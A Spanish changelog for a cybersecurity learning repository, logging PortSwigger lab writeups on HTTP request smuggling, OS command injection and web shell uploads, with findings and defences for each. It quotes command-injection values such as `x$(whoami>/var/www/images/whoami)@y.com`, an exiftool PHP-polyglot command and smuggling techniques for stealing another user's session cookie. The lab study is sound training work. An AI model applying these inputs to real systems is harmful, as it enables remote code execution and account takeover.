# CHANGELOG - Inventario de Técnicas de Ciberseguridad

Todos los cambios notables en este proyecto serán documentados en este archivo.

## [2026-05-09] — Writeup PortSwigger Capture other users' requests (CL.TE cross-user persistent)

Sexto lab del cluster HTTP Request Smuggling (Practitioner). Primer lab cross-user de la serie: smuggle CL.TE captura el request de otro usuario (administrator simulado) absorbiéndolo como body del campo `comment` de un blog post. La cookie de sesión del víctima queda almacenada en el comentario, accesible para cualquier visitante del post → account takeover. Resolución requirió 5-20 iteraciones por variabilidad de timing del back-end. Helper scripts en Python (raw socket TLS) escritos para automatizar: `test_sockets.py` (sanity check) y `smuggle_capture.py` (loop con regex parsing).

### Hallazgos no triviales documentados en el writeup

1. **La cantidad de bytes absorbida es VARIABLE iteración a iteración**, no determinística: el back-end tiene timeout de body read; cuántos bytes acumula antes del timeout depende de timing TCP, momento de arribo del víctima, comportamiento de pool del front-end. Iteraciones del MISMO payload exacto capturaron entre 745 y 819 bytes raw. Solo la(s) iteración(es) que capturen ≥819 bytes contiene(n) el cookie completo. Estrategia: iterar 10-30 veces con paciencia, no buscar "CL perfecto".
2. **Las soluciones oficiales de PortSwigger pueden quedar desactualizadas frente a victim simulators evolucionados**: la oficial dice CL=400 (víctima ~400 bytes). El víctima 2026 tiene ~830 bytes con headers `sec-ch-ua-*`, `sec-fetch-*`, `priority`. CL=400 captura solo primeros 281 bytes — antes del cookie. Hay que ajustar CL al tamaño real del víctima actual (CL=950 funcionó). Cuando una solución oficial "no funciona", el bug suele estar en parámetros, no en la técnica.
3. **Outer a `/` (no a `/post/comment`) afecta la durabilidad de la conexión back-end**: con outer a `/post/comment` el back-end devuelve 400 y puede cerrar antes; con outer a `/` devuelve 200 y mantiene la conexión más tiempo, dándole al smuggle más oportunidad de absorber bytes. Diferencia operacional importante para maximizar absorción.
4. **"Server Error: Communication timed out" en el browser es signal de smuggle vivo**: si reloadeás la página después del smuggle y ves ese error, significa que el smuggle aún espera body bytes y tu reload se absorbió como continuación, dejando al frontend esperando una response que no llega. Solución: esperar 60+ segundos antes de reloadeár para que el back-end timea y procese.
5. **Captura de tu propio request en lugar del víctima**: si reloadeás demasiado rápido, tu request browsea antes que el víctima y se absorbe. User-Agent del comentario almacenado va a ser el tuyo (Brave), no `(Victim)`. Por eso los Sec-Ch-Ua-* del víctima son distintos a los del Brave atacante: identificarlos confirma que la captura es del víctima real.
6. **Smuggling permite cross-user attacks SIN que la víctima haga click ni ejecute código** (a diferencia de XSS o CSRF clásicos): solo necesita browsear normalmente. La intercepción ocurre en capa HTTP transparente. Más sigiloso y harder to detect que XSS/CSRF tradicionales.

### Archivos nuevos

- **`learning/portswigger/capture-other-users-requests/writeup.md`**: 6 secciones, anatomía del smuggle cross-user, tabla de iteraciones reales mostrando absorción variable, comparación con reveal-front-end-request-rewriting (mismo patrón, target distinto), análisis de por qué la solución oficial está desactualizada.
- **`learning/portswigger/capture-other-users-requests/test_sockets.py`**: 5 tests del transport layer (TLS handshake, GET con/sin session, POST con CSRF dummy, dry-run del payload). Sanity check pre-iteración.
- **`learning/portswigger/capture-other-users-requests/smuggle_capture.py`**: auto-exploit en loop con raw socket TLS (libs `requests`/`httpx` rechazan CL+TE), regex parsing del comentario via urllib + html.unescape, filter de captures fake (test contamination).

### Conexión inventario

- `inventario/03-analisis-vulnerabilidades/web/analisis-request-smuggling.md`: + writeup en `learning_refs:`. Cluster Request Smuggling 6/N labs (2 detección + 4 explotación).

---

## [2026-05-09] — Writeup PortSwigger Reveal front-end request rewriting (CL.TE 2-fase)

Quinto lab del cluster HTTP Request Smuggling (Practitioner). Primer lab del cluster con explotación en 2 fases: (1) descubrir el nombre de un header de IP rewriting random (`X-ZuJFJu-Ip` en esta sesión) que el front-end agrega y (2) usar `127.0.0.1` en ese header dentro de un smuggle a `/admin/delete?username=carlos` para bypassar el control "/admin solo desde 127.0.0.1". Resuelto al primer intento sin tropiezos (los 4 labs anteriores construyeron la intuición de bytes-perfect counting y CL interno absorbente).

### Hallazgos no triviales documentados en el writeup

1. **Smuggling + endpoint reflexivo + Content-Length absorbente = primitiva de leak de headers**: el `Content-Length: 400` interno en el smuggled `POST /` con `search=` absorbe los headers de la request 2 (que el front-end ya rewriteó agregando `X-ZuJFJu-Ip: <client-ip>`). El motor de search del back-end form-decodea el body, toma el valor de `search` (que se extiende hasta los 400 bytes EOF), y refleja ese contenido literal en el HTML `<h1>X search results for '...'</h1>`. La técnica es composable con cualquier feature reflexiva (search, error pages, logs visibles) y permite leakear headers que viven solo entre front-end y back-end (auth tokens, API keys, IP rewriting, internal routing).
2. **Nombres random de headers no son defensa de seguridad — son obfuscation**: PortSwigger generó `X-ZuJFJu-Ip` esperando que el nombre random impidiera el ataque. Falla por dos vías independientes: (a) smuggling lo expone vía leak directo en una sola request, (b) el espacio de nombres semánticamente válidos para "IP del cliente" es chico (~10 nombres comunes), fuzzing dirigido lo encontraría en minutos. Aplica también a paths admin random, nombres de cookies, etc. La defensa real es autorización con autenticación criptográfica, no security-through-obscurity.
3. **Mismo `Content-Length` interno absorbente, distinto uso**: en CL.TE/TE.CL bypass labs el CL=10/200 sirvió como trituradora de headers de request 2 para evitar "Duplicate header names". En este lab el CL=400 sirve como absorbente para reflexión. Mecánica HTTP idéntica, propósito diferente. Una vez entendida la primitiva, los labs caen rápidamente — la diferencia operacional principal está en qué bytes se absorben y para qué se usan.
4. **El front-end agrega su header rewriting solo a requests que él procesa**: el smuggled vive en bytes opacos dentro del body del outer POST; el front-end no lo ve como request, no le agrega headers. El back-end sí lo parsea como request HTTP independiente y confía en sus headers — incluyendo el `X-ZuJFJu-Ip: 127.0.0.1` plantado por el atacante. Misma arquitectura defectuosa que `Host: localhost` bypass de los labs anteriores: back-end confía en un header como mecanismo de autorización.
5. **Leak completo capturado en una sola request**: el reflejo expuso `X-ZuJFJu-Ip: 152.203.247.18` (IP real del cliente) además de todos los demás headers de la request 2 hasta los 400 bytes consumidos. Suficiente para identificar el header sin necesidad de iteraciones.
6. **Lab solved al primer intento de fase 2** (no hubo iteraciones de tipo "501/401 con mensaje" como en CL.TE bypass): la suma de los aprendizajes de los 4 labs previos del cluster (chunked terminator, byte counting, single connection, CL interno absorbente) hizo que la fase 2 funcionara directamente con el header descubierto.

### Archivos nuevos

- **`learning/portswigger/reveal-front-end-request-rewriting/writeup.md`**: 6 secciones, 2 fases documentadas (leak via search reflection con CL=400 absorbente, delete con header descubierto + 127.0.0.1), tabla comparativa de los 3 labs de bypass del cluster (CL.TE bypass, TE.CL bypass, reveal request rewriting), insight sobre security-through-obscurity.

### Conexión inventario

- `inventario/03-analisis-vulnerabilidades/web/analisis-request-smuggling.md`: + writeup en `learning_refs:`. Cluster Request Smuggling 5/N labs (2 detección + 3 explotación).

---

## [2026-05-09] — Writeups PortSwigger Bypass front-end controls (CL.TE + TE.CL)

Cluster HTTP Request Smuggling extendido con dos labs de explotación (Practitioner). Mismo escenario en ambos: front-end bloquea `/admin` con regla de path; back-end aplica regla `Host == localhost` para `/admin`; smuggling resuelve ambas restricciones cruzando bytes que el front-end nunca ve. Eliminación final del usuario `carlos` vía `GET /admin/delete?username=carlos` smuggleado.

### Hallazgos no triviales documentados en los writeups

1. **`Content-Length` interno del request smuggleado funciona como trituradora de bytes, no como descriptor de body real**: cuando la request 2 llega al socket TCP, sus headers (`POST / HTTP/1.1`, `Host: <lab>`, etc.) se concatenan al smuggled prefix. Sin `Content-Length` declarado en el smuggled, el backend los parsea como headers adicionales del `GET /admin/...`, produciendo `Host` duplicado → 400 "Duplicate header names are not allowed". Declarar un `Content-Length` (10 en CL.TE, 200 en TE.CL) hace que esos bytes se lean como body en lugar de como headers. El valor exacto no importa, solo que sea ≥ longitud de los headers que vienen detrás.
2. **`Host: localhost` como bypass de control de acceso es el patrón compartido entre CL.TE y TE.CL**: front-ends bloquean `/admin` para tráfico externo pero back-ends confían en `Host: localhost` como mecanismo de autenticación interno. El smuggling cruza la frontera sin que el front-end vea el Host alternativo. Defensa correcta: autenticación real (cookie/token) en el back-end, no confianza en Host headers.
3. **TE.CL es operacionalmente más frágil que CL.TE en explotación**: el chunk size en hex obliga a recalcular byte-perfect cada vez que cambia el contenido del smuggled (path, headers, CL interno). En CL.TE solo cambia el outer `Content-Length`. Documentado tropiezo educativo: primer intento con chunk size `71` falló con 400 "Invalid request" porque el conteo real era `70` (off-by-one por contar el separador `\r\n` entre chunks como data). Después de cambiar `/admin` a `/admin/delete?username=carlos`, recálculo a `87` (delta +23 bytes).
4. **Del lab de detección al lab de explotación el salto conceptual es mínimo**: mismo setup de Burp, misma single connection, mismo principio de chunked terminator / chunk size. La única adición operacional es el `Content-Length` interno para evitar header pollution. Tabla comparativa detección vs explotación en sección 3 de cada writeup.
5. **Set-Cookie en la response 2 confirma el procesamiento del smuggled**: en TE.CL, la response 2 al delete incluyó un `Set-Cookie: session=...` nuevo. Es el back-end asignando sesión al "cliente" que él cree estar viendo (es decir, al smuggled GET /admin/delete que no tenía cookie). El cliente real no la usa porque tiene la suya. Señal de que el smuggled request fue procesado independientemente del contexto del cliente real.
6. **Off-by-one tradicional del chunked encoding**: al contar los bytes del chunk, el `\r\n` que sigue a la data NO cuenta — es separador entre chunks. Sumarlo da off-by-one (+2 si contás ambos bytes, +1 si contás solo `\r`). Tabla explícita línea-por-línea con bytes y acumulado en sección 2 de cada writeup, validada manualmente.

### Archivos nuevos

- **`learning/portswigger/bypass-front-end-controls-cl-te/writeup.md`**: 6 secciones, 4 iteraciones documentadas (smuggle sin Host: localhost → 401, smuggle con Host: localhost sin CL → 400 Duplicate, smuggle con CL=10 → admin panel, smuggle del delete → carlos eliminado), explicación del CL interno como mecanismo de absorción.
- **`learning/portswigger/bypass-front-end-controls-te-cl/writeup.md`**: 6 secciones, 3 iteraciones documentadas (chunk size `71` → 400, recálculo a `70` → admin panel, cambio a `/admin/delete` con recálculo a `87` → carlos eliminado), tabla comparativa CL.TE bypass vs TE.CL bypass.

### Conexión inventario

- `inventario/03-analisis-vulnerabilidades/web/analisis-request-smuggling.md`: + 2 writeups en `learning_refs:`. Cluster Request Smuggling 4/N labs (2 detección + 2 explotación).

---

## [2026-05-09] — Writeup PortSwigger Confirming TE.CL via differential responses

Segundo lab del cluster HTTP Request Smuggling (Practitioner). Variante invertida de CL.TE: front-end usa Transfer-Encoding chunked, back-end usa Content-Length. Payload con CL=4 + chunk size `5e` (94 bytes) conteniendo `POST /404 HTTP/1.1` como request smuggled. Frontend forwardea todo (lee chunked OK), backend lee solo 4 bytes (`5e\r\n`) y deja el resto en buffer; segunda request lee desde buffer, procesa POST /404, devuelve 404. Resuelto con tropiezo educativo: primer intento con `GPOST /` y chunk size `5c` (92 bytes) confundió el backend pero produjo "Connection closed" en lugar de 404, y el lab no marcó solved porque su detector matchea status code 404, no error de método.

### Hallazgos no triviales documentados en el writeup

1. **Chunk size en hex es el byte más frágil del payload TE.CL**: cualquier modificación del contenido del chunk (path, headers, content) requiere recalcular en hex. Es la fuente más común de "el payload no funciona" porque copy-paste de internet sin recálculo es la rutina natural. Defensa operacional: contar dos veces, usar tool externo (Burp HTTP Request Smuggler), no confiar en que un payload modificado mantiene el size original.
2. **Heurísticas de los labs matchean responses específicas, no comportamiento genérico**: `GPOST /` (método inválido) confunde el backend pero produce 405/connection close, no 404. PortSwigger detecta vía status 404, así que un payload conceptualmente correcto pero con response distinta no satisface el lab. Lección: chequear el "indicador de éxito" del lab antes de inventar variantes del payload.
3. **CL.TE y TE.CL son inversos pero comparten método de detección**: ambos producen 404 en la segunda request cuando smuggled prefix es `[METHOD] /404`. Misma señal de salida desde la perspectiva del lab pese a mecánicas opuestas. Tabla comparativa en sección 3.2 del writeup.
4. **`POST /404` vs `GPOST /` no es equivalente**: el primero usa método estándar + path inexistente → 404 predecible. El segundo usa método no estándar → 405/400/cierre, depende del parser. La fragilidad de la primera versión la documenta el writeup como tropiezo.
5. **Bytes residuales después del smuggle explican el "Connection closed"**: en TE.CL, después que el backend procesa la request smuggled con su CL=15 chico, los bytes restantes (`T / HTTP/1.1...`) son malformed → backend cierra socket. Eso aparece como "Connection closed during request sequence" en Burp. Es comportamiento esperable, no señal de fallo.
6. **Send group must be "in sequence (single connection)"**: opciones parallel o "separate connections" rompen el bug. Burp ofrece 4 modos en el dropdown del Send group; solo uno funciona.

### Archivos nuevos

- **`learning/portswigger/confirming-te-cl-via-differential-responses/writeup.md`**: 6 secciones, trazado byte-por-byte del flujo TE.CL, tabla comparativa CL.TE vs TE.CL, anécdota del primer intento fallido con `GPOST` y chunk size incorrecto, contramedidas (mismas que CL.TE + heurística específica de CL anormalmente chico con TE chunked).

### Conexión inventario

- `inventario/03-analisis-vulnerabilidades/web/analisis-request-smuggling.md`: + writeup en `learning_refs:`. Cluster Request Smuggling 2/N labs.

---

## [2026-05-08] — Writeup PortSwigger Confirming CL.TE via differential responses + nuevo análisis de Request Smuggling

Primer lab del cluster HTTP Request Smuggling (Practitioner). Detección de CL.TE: front-end usa Content-Length, back-end usa Transfer-Encoding chunked. Headers contradictorios crean gap de parseo: front-end forwardea N bytes, back-end consume M < N por chunked terminator (`0\r\n\r\n`), los `N-M` sobrantes quedan en socket TCP keep-alive y se prependen a la siguiente request. Payload de 35 bytes con prefix `GET /404 HTTP/1.1` smuggled → segunda request del cliente es procesada como GET /404 → 404 confirma desync.

### Hallazgos no triviales documentados en el writeup

1. **Smuggling es bug de frontera entre parsers, no de aplicación**: front-end y back-end procesan los mismos bytes con reglas distintas. El gap entre las dos vistas es el canal. La aplicación en sí es irrelevante — bug enteramente de infraestructura HTTP/1.1.
2. **Detection via differential responses requiere modelo mental de keep-alive**: la víctima del gap es la siguiente request en el mismo socket, no la propia. La response observable es la de request 2, no de request 1. Sin entender keep-alive sockets compartidos entre requests, el comportamiento es opaco.
3. **HTTP/2 cierra la categoría completa por construcción**: bodies con frames de longitud explícita, no hay ambigüedad CL/TE. Si el path frontend↔backend es HTTP/2, el bug no existe. Defensa estructural preferible a normalización defensiva en HTTP/1.
4. **CL=35 byte-perfect importa**: el body no debe tener CRLF trailing después del último char. Burp puede agregarlo automático y el conteo pasa a 37, lo cual hace que el sobrante quede en socket del frontend (no del backend) y no smuggle. Conteo manual byte-por-byte es parte del workflow.
5. **Setup de Burp es parte del bug**: requiere desactivar "Update Content-Length" + downgrade a HTTP/1 (HTTP/2 es default). Tooling automático (curl, requests) maneja CL automático y no permite reproducir el bug. La elección de tool determina si el bug es reproducible.
6. **Tres variantes (CL.TE, TE.CL, TE.TE) requieren payloads distintos**: cada combinación de quién prioriza qué header tiene su propia mecánica. PortSwigger tiene labs separados para cada una.

### Archivos nuevos

- **`learning/portswigger/confirming-cl-te-via-differential-responses/writeup.md`**: 6 secciones, trazado byte-por-byte del flujo CL.TE, tabla comparativa CL.TE/TE.CL/TE.TE, contramedidas (HTTP/2 + sin keep-alive + parser strict + same-software).
- **`inventario/03-analisis-vulnerabilidades/web/analisis-request-smuggling.md`**: nuevo análisis de la vulnerabilidad. Cubre las tres variantes, payloads de detección, herramientas (Burp Smuggler, smuggler.py, h2c-smuggler), contramedidas estructurales.

### Conexión inventario

- **Nuevo archivo en inventario**: `analisis-request-smuggling.md` (Avanzada, Web). Inventario sube de 134 a 135 archivos.
- `inventario/03-analisis-vulnerabilidades/web/analisis-request-smuggling.md`: writeup en `learning_refs:`. Cluster Request Smuggling 1/N labs.

---

## [2026-05-08] — Aplazados los 2 labs OS command injection OOB (requieren Burp Pro)

Los labs `lab-blind-out-of-band` y `lab-blind-out-of-band-data-exfiltration` validan que Collaborator reciba un DNS lookup. Sin Burp Pro y con el firewall de PortSwigger Academy bloqueando exfil a webhook.site/interactsh/requestbin, no hay ruta honesta de resolución. Documentados en `learning/portswigger/PENDING.md` con payloads listos para retomar y razón. Cluster OS Command Injection: 3 labs resueltos (simple, time-delays, output-redirection) + 2 aplazados a Pro.

---

## [2026-05-08] — Writeup PortSwigger Blind OS command injection with output redirection

Tercer lab del cluster OS Command Injection (Practitioner). Misma forma que time-delays (feedback form, validación de email, command substitution `$(...)` para mantener formato) pero ahora se exfiltra output completo en lugar de detectar binariamente. Payload: `email=x$(whoami>/var/www/images/whoami)@y.com`. Recuperación: `GET /image?filename=whoami` devuelve `peter-nwuHUj` (con Content-Type: image/jpeg engañoso, body es texto). Tropiezo operacional: pasar path completo al filename del GET concatena dos veces el directorio raíz; pasar solo el nombre relativo funciona.

### Hallazgos no triviales documentados en el writeup

1. **Composición de servicios legítimos = canal de exfiltración**: tres capas separadas (inyección + filesystem escribible por web user + endpoint que sirve archivos del filesystem) cada una con justificación de diseño. Combinadas forman lectura arbitraria. El error no está en una capa, está en no analizar la composición.
2. **Output redirection vs time-based: 1500x diferencia de eficiencia**: extraer un username de 12 chars con time-based requiere ~50 minutos (12 × 26 × 10s, con búsqueda binaria menos pero del orden). Output redirection: 2 requests, segundos. Cuando hay canal de archivos, siempre superior a inferencia bit-a-bit.
3. **`>` vs `>>` importa para tests iterativos**: truncar (`>`) hace que cada test sobrescriba; appendear (`>>`) acumula y mezcla outputs. Para iterar comandos contra el mismo archivo de salida, `>` es correcto.
4. **El endpoint sirve sin enumeración previa**: cualquier filename en el dir, no whitelist. Razonable para app de imágenes (filenames variables por producto), pero combinado con escritura arbitraria es trampa. Whitelist de extensiones (`\.(jpg|png|...)$`) cierra parcialmente — rechaza `whoami` sin extensión.
5. **Path canonicalization (`realpath` + verificar prefijo) es la defensa transversal** para endpoints que toman filename: bloquea `../` y symlinks. Combinado con whitelist de extensiones reduce el universo a archivos esperados.
6. **Por qué Practitioner sobre simple case**: cuatro saltos — sin reflejo, validación previa al shell, identificación de filesystem servido, composición de canales. Cada uno habilidad adicional sobre el baseline.

### Archivos nuevos

- **`learning/portswigger/blind-os-command-injection-output-redirection/writeup.md`**: 6 secciones, tabla de tres capas componibles del bug, comparación cuantitativa output redirection vs time-based, fix del endpoint con whitelist + realpath, defensas operacionales (FIM, mínimo privilegio, network egress filtering).

### Conexión inventario

- `inventario/03-analisis-vulnerabilidades/web/analisis-command-injection.md`: + writeup en `learning_refs:`. Cluster OS Command Injection 3/N labs.

---

## [2026-05-08] — Writeup PortSwigger Blind OS command injection with time delays

Segundo lab del cluster OS Command Injection (Practitioner). Mismo patrón de feedback form, pero la respuesta no refleja output. Detección vía time delay con `sleep 10`. Primer intento `email=a@b.c;sleep 10` falla (500 en <1s) porque hay validación de regex de email previa al shell. Bypass con command substitution: `email=x$(sleep 10)@y.com` — pasa el regex (estructura `<algo>@<algo>` válida), shell evalúa `$(sleep 10)` y deja `x@y.com` para `mail`. Response: 200 OK en 10,240ms.

### Hallazgos no triviales documentados en el writeup

1. **Dualidad de representación entre validación y shell**: la regex de email opera sobre la forma literal del input (`x$(sleep 10)@y.com`), el shell opera sobre la forma post-expansión (`x@y.com`). El gap es la trampa: el atacante construye un payload que pasa una vista mientras es ejecutable en la otra. Defensa estructural: pasar argv como array, no concatenar al shell.
2. **Validación de formato no es defensa contra injection**: regex laxos como `[^@]+@[^@]+\..+` aceptan `$()`, backticks, otros metacaracteres. Whitelist explícita (`[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}`) los rechaza pero sigue siendo capa frágil — la fix correcta es estructural.
3. **Time-based como canal lateral en blind**: tabla de canales de detección (tiempo, OAST/DNS, redirección a archivo, errores diferenciales) con pros/contras. Time es baseline simple pero ruidoso (network jitter, lentitud por test). OAST es más rápido y permite exfiltrar.
4. **Confirmación de injection requiere correlación tiempo-payload**: `sleep 5` debe dar ~5s, `sleep 15` debe dar ~15s. Si ambos dan 10s, hay delay fijo del backend, no injection. La correlación es el control que distingue inyección real de coincidencia.
5. **Por qué este lab es Practitioner sobre el simple case**: tres saltos — detección sin reflejo (canal lateral), validación previa al shell (separadores triviales bloqueados), command substitution como técnica que mantiene formato del input. Cada capa adicional es una habilidad que el simple case no probó.

### Archivos nuevos

- **`learning/portswigger/blind-os-command-injection-time-delays/writeup.md`**: 6 secciones, comparación de payloads válidos vs rechazados, tabla de 4 canales de detección blind, código backend probable con regex laxo + `shell=True`, defensa con SMTP directo + whitelist de caracteres + sin shell.

### Conexión inventario

- `inventario/03-analisis-vulnerabilidades/web/analisis-command-injection.md`: + writeup en `learning_refs:`. Cluster OS Command Injection 2/N labs.

---

## [2026-05-08] — Writeup PortSwigger OS command injection simple case

Primer lab del cluster OS Command Injection (Apprentice). Endpoint "Check stock" con `productId` y `storeId` que el backend pasa sin sanitizar a un shell (`stockreport.sh <productId> <storeId>`). Inyectando `|whoami` en `storeId`, el shell parsea el pipe y ejecuta `whoami` además del comando original. Output reflejado: `peter-KP0AX5`.

### Hallazgos no triviales documentados en el writeup

1. **El bug es estructural, no de filtrado**: construir comandos como string + invocar shell (`shell=True`, `Runtime.exec(String)`, `system()`) es la categoría completa del problema. Filtrar metacaracteres es mitigación frágil — la lista de separadores es larga, los encodings rompen filtros, y un cambio de código puede revertir la protección.
2. **Inyectar en el último parámetro produce output más limpio**: `stockreport.sh 1 1|whoami` deja `whoami` al final del pipeline sin argumentos espurios. Inyectar en `productId` lo dejaría en el medio (`stockreport.sh 1|whoami 1`), lo cual puede confundir el output según parsing.
3. **Reflejada vs ciega es eje ortogonal a la severidad**: el lab es trivial de detectar porque la respuesta refleja el output, pero el mismo bug sin reflejo sigue siendo RCE — solo cambia el método de detección (time-based con `sleep`, OAST con `nslookup`, redirección a archivo servible).
4. **Equivalencia cross-lenguaje del fix**: `subprocess.run([...], shell=False)` en Python, `ProcessBuilder` en Java, `child_process.execFile` en Node, `exec.Command` en Go. Todos comparten la propiedad estructural de pasar `argv[]` literal sin shell intermedio.
5. **Validación numérica como defensa-en-profundidad**: cuando el dominio del input es enumerable (numérico, set fijo de valores), validar antes de invocar subprocess. No reemplaza la API correcta, la complementa.

### Archivos nuevos

- **`learning/portswigger/os-command-injection-simple-case/writeup.md`**: 6 secciones, anatomía del bug con código backend probable, tabla de separadores de shell, comparación reflejada/ciega/OOB, fix estructural cross-lenguaje, defensa-en-profundidad con validación + mínimo privilegio + WAF.

### Conexión inventario

- **Sin nuevos archivos en inventario**: refuerza `analisis-command-injection.md`. Inventario en 134 archivos.
- `inventario/03-analisis-vulnerabilidades/web/analisis-command-injection.md`: + writeup en `learning_refs:`. Cluster OS Command Injection arrancado (1/N labs).

---

## [2026-05-09] — Writeup PortSwigger Web shell upload via race condition

Séptimo y último lab del cluster File Upload (Expert). El server escribe el archivo a disco antes de validar. Si la validación falla, devuelve 403 al cliente y borra el archivo. Pero entre la escritura y el borrado hay ~2-15ms durante los cuales `/files/avatars/exploit.php` es accesible vía HTTP. Un GET que cae en esa ventana ejecuta el PHP antes de que el delete corra. Resuelto con script Python con 5 uploaders + 30 readers concurrentes — secret obtenido en <2 segundos pese a que TODOS los uploads devolvieron 403.

### Hallazgos no triviales documentados en el writeup

1. **TOCTOU en server: estado de la operación ≠ estado del recurso**. El 403 al cliente dice "upload rechazado", pero entre escritura y borrado el archivo fue brevemente accesible. Asumir equivalencia entre los dos estados es bug categórico. Defensa naïve: "rechazo el upload, así que no hay archivo malicioso disponible". Realidad: "rechazo el upload, pero el archivo malicioso fue brevemente disponible".
2. **El sanity check del exploit confirma el modelo mental**: `upload_ok=0 upload_err=2 reads=28` con secret obtenido. Los uploads devuelven 403 al thread del cliente; los reads paralelos hit la ventana entre write y delete. Sin comprender esto, el atacante asume que 403 = no hay archivo y se rinde.
3. **Race conditions requieren tooling concurrente**: el bypass no es manual. Scripting con threads (Python `requests`), Burp Pro Turbo Intruder, o request grouping de Burp 2024+. Sin concurrencia, ventana de ms es imposible de hit.
4. **Tres arquitecturas posibles del server, solo una es vulnerable**: (A) validación post-write con borrado — vulnerable, este lab. (B) validación pre-write — no vulnerable. (C) staging dir + atomic move al directorio público — defensa correcta. Diferenciar entre las tres requiere análisis empírico (manual upload manual + GET + observar comportamiento).
5. **Patrón TOCTOU se repite en muchos dominios**: `access()`+`open()` (symlink swap), priv check + acción (rotación de sesión), cache invalidation, email confirmation tokens, auth + uso de archivo. La defensa estructural es **atomicidad** — combinar check+use en operación no-interleavable, locks, transacciones.
6. **Por qué este lab es Expert y no Practitioner**: requiere conocimiento de TOCTOU, tooling para concurrencia, modelo mental de pipeline server-side, y escritura de exploit funcional (no solo construcción de payload). Es el primer lab del cluster donde la habilidad probada es código de explotación.
7. **Defensa correcta = staging + atomic move**: validación cara (re-encoding, AV) en directorio fuera del document root, atomic `rename()` solo después de pasar todas las validaciones. Atomic dentro del mismo filesystem. Cierra el race por construcción. Combinado con filename server-controlled (UUID), incluso si race se ganara el atacante no sabe el filename para hacer el GET.

### Archivos nuevos

- **`learning/portswigger/file-upload-race-condition/writeup.md`**: 6 secciones, script Python real (sanity check + 5 uploaders + 30 readers), trace temporal del bug (W → V → D), tabla TOCTOU generalizada a 6 dominios, comparación de 3 arquitecturas server-side, defensa correcta con staging dir + atomic rename, tabla comparativa final de los 7 labs del cluster (3 Apprentice + 3 Practitioner + 1 Expert).
- **`/tmp/race.py`**: script reusable para race condition exploits. Sanity check inicial, marcadores `BEGIN_..._END` para distinguir output PHP de noise, abort detection si todos los uploads fallan.

### Conexión inventario

- **Sin nuevos archivos en inventario**: refuerza `explotacion-fileupload.md`. Inventario en 134 archivos.
- `inventario/04-explotacion/web/explotacion-fileupload.md`: + writeup en `learning_refs:`. **Cluster File Upload completo con 7/7 labs linkeados** (3 Apprentice + 3 Practitioner + 1 Expert).

### Cluster File Upload completado al 100%

Los 7 labs del cluster cubren las defensas progresivas más comunes contra upload + RCE y sus bypasses específicos. La defensa estructuralmente correcta combina capas: whitelist de extensión + magic bytes + re-encoding server-side + filename server-controlled + validación pre-write o staging dir + atomic move + dir sin scripts + mínimo privilegio. Cada capa cierra una clase de bypass; ninguna por sí sola alcanza. **Filename server-controlled + re-encoding + staging dir** son las tres defensas más fuertes — cada una cierra una familia entera de bypasses.

### Lección de proceso

Code review con ultrathink antes de correr el script identificó issues críticos que ahorraron debugging:
1. Sanity check inicial (detecta CSRF/session inválidos antes de spawn).
2. Counter separado `upload_ok` vs `upload_err` (visibilidad operacional crítica — confirmó que el race funciona pese a 403s).
3. Abort detection si todos los uploads fallan.

El insight más importante del review: **`upload_err > 0` no es señal de fracaso del exploit**. En este lab específico, todos los uploads devuelven 403 y el secret se obtiene igual. Sin esa hipótesis explícita en el código (counters separados), un debugger se confundiría asumiendo que CSRF expiró cuando en realidad el race está funcionando perfectamente.

## [2026-05-09] — Writeup PortSwigger RCE via polyglot web shell upload

Sexto lab del cluster File Upload (Practitioner). Defensa: validación de magic bytes del contenido (cierra todos los bypasses anteriores que cambiaban filename/Content-Type sin tocar el contenido). Bypass: polyglot JPEG+PHP — archivo válido como dos formatos a la vez. `exiftool -Comment='<?php ...'` inyecta el código en el campo Comment del EXIF; el archivo mantiene magic bytes JPEG (`FF D8 FF`) y pasa la validación, pero contiene el bloque PHP que Apache ejecuta cuando procesa la extensión `.php`.

### Hallazgos no triviales documentados en el writeup

1. **Polyglot rompe la asunción "un archivo, un formato"**: un archivo puede contener múltiples formatos válidos simultáneamente. La validación lo lee como imagen y "acierta"; Apache lo lee como PHP y "acierta". Las dos lecturas son consistentes con el archivo. El bug está en asumir formato único.
2. **`mime_content_type` solo mira los primeros bytes**: detecta tipo desde magic bytes en el header. Bytes posteriores al header no afectan la decisión. Por eso un archivo que empieza con header JPEG y contiene PHP después es "image/jpeg" según esta función. Diseño correcto para detección rápida; insuficiente como defensa contra polyglots.
3. **Anatomía del polyglot JPEG+PHP en EXIF**: `exiftool -Comment` inyecta el PHP en el segmento APP1 (EXIF) del JPEG. La estructura JPEG queda estrictamente válida — magic bytes correctos, marcadores SOI/EOI presentes, scan data intacta. Image viewers, `mime_content_type`, `getimagesize` todos lo aceptan como JPEG normal. Más sigiloso que concatenación cruda.
4. **Concatenación cruda (`cat image.jpg shell.php > polyglot.php`) también suele funcionar**: bytes después del marcador EOI son técnicamente inválidos según la spec JPEG, pero `mime_content_type` no parsea hasta el EOI; image viewers paran ahí; PHP parsea el archivo entero secuencialmente y encuentra el `<?php>`. Defensas más estrictas (`getimagesize` que parsea pixel data) detectan; defensas comunes no.
5. **Familia de polyglots**: JPEG+PHP, PNG+PHP (en chunk `tEXt`), GIF+JS (`GIF89a;<script>`), PDF+ZIP (header PDF al principio + central directory ZIP al final), JAR+ZIP (cualquier JAR es ZIP). Recurso de referencia: Ange Albertini "Funky File Formats" / Corkami docs.
6. **Re-encoding server-side es la defensa estructural**: cargar la imagen con una librería que parsea el formato real (GD, ImageMagick, Pillow, ImageIO), convertir a representación interna, re-escribir como JPEG/PNG nuevo. Descarta metadata, segmentos extra, código embebido. Produce archivo estrictamente del formato declarado y solo eso. CPU-intensive pero estructuralmente robusto.
7. **Tabla de progresión completa de los 6 labs del cluster**: simple → content-type → path-traversal → extension-blacklist (.htaccess) → obfuscated-extension (null byte) → polyglot. 6 asunciones rotas, una sola defensa correcta (whitelist + magic bytes + re-encoding + filename server-controlled + dir sin scripts + mínimo privilegio). Catálogo completo de "qué representación del input la defensa mira vs cuál el sistema ejecuta".

### Archivos nuevos

- **`learning/portswigger/file-upload-polyglot-web-shell/writeup.md`**: 6 secciones, dos métodos de construcción del polyglot (exiftool limpio + cat crudo), antipatrón PHP `mime_content_type` sin re-encoding, anatomía de la estructura JPEG con segmentos SOI/APP0/APP1/SOS/EOI, familia de polyglots conocidos, defensa correcta con re-encoding + 5 capas, tabla comparativa de los 6 labs del cluster.

### Conexión inventario

- **Sin nuevos archivos en inventario**: refuerza `explotacion-fileupload.md` (que ya cubre polyglots y exiftool en sección Comandos / Ejemplos). Inventario en 134 archivos.
